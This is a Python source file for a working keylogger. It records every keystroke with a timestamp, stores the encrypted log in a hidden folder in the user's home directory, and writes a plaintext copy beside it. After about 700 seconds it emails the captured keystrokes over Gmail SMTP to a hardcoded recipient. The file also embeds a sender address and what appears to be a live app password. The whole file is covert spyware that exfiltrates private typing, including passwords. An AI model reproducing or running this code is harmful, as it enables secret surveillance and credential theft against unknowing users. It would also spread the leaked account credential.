import os
import time
from datetime import datetime
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

hidden_dir = os.path.join(os.path.expanduser("~"), ".hidden_dir")
os.makedirs(hidden_dir, exist_ok=True)

key_file_path = os.path.join(hidden_dir, "encryption_key.txt")
log_file_path = os.path.join(hidden_dir, "keylog_encrypted.txt")

text = []

class EmailSender:
    def __init__(self, email, app_password):
        self.email = email
        self.app_password = app_password
        self.smtp_server = "smtp.gmail.com"
        self.smtp_port = 587

    def send(self, recipient, subject, body):
        msg = MIMEMultipart()
        msg["From"] = self.email
        msg["To"] = recipient
        msg["Subject"] = subject
        msg.attach(MIMEText(body, "plain", "utf-8"))

        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.email, self.app_password)
                server.send_message(msg)
            return True
        except Exception as e:
            print(f"Email sending error: {e}")
            return False

def load_or_create_key():
    if os.path.exists(key_file_path):
        with open(key_file_path, "rb") as f:
            return f.read()
    key = Fernet.generate_key()
    with open(key_file_path, "wb") as f:
        f.write(key)
    return key

key = load_or_create_key()
cipher = Fernet(key)

def encrypt_message(message: str) -> bytes:
    return cipher.encrypt(message.encode())

def format_key(key):
    if hasattr(key, 'char') and key.char:
        return key.char
    special_keys = {
        Key.space: " ",
        Key.enter: "\n[ENTER]\n",
        Key.backspace: "[BACKSPACE]",
        Key.tab: "[TAB]",
        Key.shift: "[SHIFT]",
        Key.ctrl: "[CTRL]",
        Key.alt: "[ALT]",
        Key.cmd: "[CMD]",
        Key.esc: "[ESC]",
        Key.up: "[UP]",
        Key.down: "[DOWN]",
        Key.left: "[LEFT]",
        Key.right: "[RIGHT]"
    }
    return special_keys.get(key, f"[{key.name}]")

def on_press(key):
    try:
        key_str = format_key(key)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"{timestamp} | {key_str}"

        encrypted_entry = encrypt_message(entry)
        with open(log_file_path, "ab") as f:
            f.write(encrypted_entry + b'\n')

        text.append(entry)
    except Exception as e:
        print(f"Logging error: {e}")

def on_release(key):
    if key == Key.esc:
        return False

def stop_listener(listener, seconds=700):
    time.sleep(seconds)
    listener.stop()

def send_logs(content):
    if not content:
        return False
    
    YOUR_EMAIL = "hcc.sso.edu.tw@gmail.com"
    YOUR_APP_PASSWORD = "ryef swlm hszq uhdn"
    
    sender = EmailSender(YOUR_EMAIL, YOUR_APP_PASSWORD)
    
    body = "\n".join(content)
    
    summary = f"Total keys logged: {len(content)}\n\n"
    full_body = summary + body
    
    success = sender.send(
        recipient="dxjh112109@dxjh.hcc.edu.tw",
        subject=f"Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        body=full_body
    )
    
    return success

def main():
    pass

if __name__ == "__main__":    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        threading.Thread(target=stop_listener, args=(listener,), daemon=True).start()
        listener.join()    
    if text:
        debug_log_path = os.path.join(hidden_dir, "keylog_debug.txt")
        with open(debug_log_path, "w", encoding="utf-8") as f:
            f.write("\n".join(text))
    
    send_logs(text)
